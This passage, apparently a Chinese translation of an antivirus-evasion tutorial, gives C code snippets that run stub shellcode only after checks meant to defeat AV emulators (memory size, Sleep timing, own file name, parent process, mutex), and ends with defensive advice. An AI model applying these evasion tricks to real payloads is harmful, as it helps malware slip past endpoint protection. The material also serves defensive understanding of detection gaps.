```cpp
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")
int main()
{
    PROCESS_MEMORY_COUNTERS pmc;
    GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
    if (pmc.WorkingSetSize <= 3500000)
    {
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```



### 例子2： Time distortion

我们知道Sleep函数是被AV仿真了。做这个是为了阻止使用一个简单的Sleep调用就绕过扫描时间限制。这个问题是，是否在这个模拟的Sleep方式中存在缺陷？

```c
#include <time.h>
#pragma comment(lib, "winmm.lib")
int main()
{
    DWORD mesure1;
    DWORD mesure2;
    mesure1 = timeGetTime();
    Sleep(1000);
    mesure2 = timeGetTime();
    if ((mesure2 > (mesure1 + 1000)) && (mesure2 < (mesure1 + 1005)))
    {
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```



### 例子3：What is my name?

直接看代码都能懂

```c
int main(int argc, char *argv[])
{
    if (strstr(argv[0], "test.exe") > 0)
    {
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```



## The “I call myself” method

这是环境检查方法的一个变体。AV只有在以某种方式调用时才会触发代码

### 例子1：I am my own father 

在这个例子中，如果它的父进程也是test.exe的话，可执行文件（test.exe）才会进入解密的分支。当代码被安装，它会获取其父进程的ID，如果其父进程不是test.exe，它会调用test.exe然后停止。被调用的进程也有一个叫test.xee的父进程并且进入解密部分。

```c
#include <TlHelp32.h>
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")
int main()
{
    int pid = -1;
    HANDLE hProcess;
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);
    // Get current PID
    pid = GetCurrentProcessId();
    if (Process32First(h, &pe))
    {
        // find parent PID
        do
        {
            if (pe.th32ProcessID == pid)
            {
                // Now we have the parent ID, check the module name
                // Get a handle to the process.
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
                                       pe.th32ParentProcessID);
                // Get the process name.
                if (NULL != hProcess)
                {
                    HMODULE hMod;
                    DWORD cbNeeded;
                    TCHAR processName[MAX_PATH];
                    if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
                    {
                        // If parent process is myself, decrypt the code
                        GetModuleBaseName(hProcess, hMod, processName,
                                          sizeof(processName) / sizeof(TCHAR));
                        if (strncmp(processName, "test.exe", strlen(processName)) == 0)
                        {
                            decryptCodeSection();
                            startShellCode();
                        }
                        else
                        {
                            // or else call my binary in a new process
                            startExe("test.exe");
                            Sleep(100); // Wait for child
                        }
                    }
                }
                // Release the handle to the process.
                CloseHandle(hProcess);
            }
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    return 0;
}
```



### 例子2：First open a mutex

在这个例子中，只有当一个确定的互斥量对象已经存在于系统中，代码（test.exe)才会开始解密代码。这个技巧是这样，当这个对象不存在，代码会创建并调用其自己一个新的实例。在父进程结束之前，子进程会尝试创建一个互斥量，会进入这个ERROR_ALREADY_EXIST代码分支。

```c
int main()
{
    HANDLE mutex;
    mutex = CreateMutex(NULL, TRUE, "muuuu");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        decryptCodeSection();
        startShellCode();
    }
    else
    {
        startExe("test.exe");
        Sleep(100);
    }
    return 0;
}
```

# 结论

以上例子说明，若是能够利用杀软的弱点，绕过他们是很容易的。仅仅需要一些关于windows系统的知识和杀软工作的机制。但是，我并不是说杀软是没用的。杀软在检测已经存在于特征数据库种的恶意代码是非常有用的。同时，杀软对于系统恢复也是很有用的。我想说的是，杀软可以容易被新的病毒戏弄，尤其是对于有目的的攻击。

自定义的恶意软件经常作为APT攻击的一部分，杀软可能对于它们的攻击显的没有用。这并不意味着丢失了一切！对于杀软有选择的方案：加固系统、设置应用程序白名单机制、基于主机的入侵防御系统IPS等。这些解决方案有其长度和短处。



如果我给一些谦虚的建议来抵抗恶意软件，我想说：

1.  没必要的情况下永远不要作为administrator权限去运行程序。这个黄金定律在没有杀软的情况下，能够避免99%的恶意软件。这个已经成为Linux用户做一些操作的正常的方式很多年了。这是我最重要的安全措施建议。
2.  加固系统，当前版本的windows系统有很强大的安全特性，尽管使用。
3.  部署NIDS（[入侵](https://www.77169.net/qqhack/hkrq-hejs)检测系统）监控你的网络。很多时候，感染恶意软件并不是在受害者机器上被检测到的，而是应该感谢NIDS和防火墙日志。
4.  使用多个不同厂商的杀软。一个产品的长处可以覆盖另一个短处，也有可能一个国家的杀软对于来自该国家的杀软竟会更加熟
5.  最后一点，安全意识建设。如果人被利用了，那么杀软基本是没用的。
